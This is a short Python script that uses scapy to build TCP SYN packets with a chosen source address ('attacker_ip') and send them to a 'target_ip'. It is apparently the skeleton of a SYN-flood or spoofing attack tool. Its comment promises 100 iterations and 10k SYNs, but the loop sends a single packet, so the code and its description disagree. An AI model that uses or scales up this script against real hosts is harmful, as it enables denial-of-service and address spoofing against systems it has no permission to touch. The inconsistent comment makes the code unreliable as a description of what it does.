from scapy.all import *
from scapy.layers.inet import IP, TCP


def build_syn_packet(src_machine_ip, dst_machine_ip):
    ip = IP(src=src_machine_ip, dst=dst_machine_ip)
    syn = TCP(sport=40508, dport=40508, flags="S", seq=12345)
    return ip / syn


if __name__ == '__main__':
    args_list = sys.argv[1:]

    attacker_ip = args_list[0]
    target_ip = args_list[1]

    # iterate with 100 iterations and send the 10k syn to target
    for i in range(0, 1):
        syn_pkt = build_syn_packet(attacker_ip, target_ip)
        send(syn_pkt)

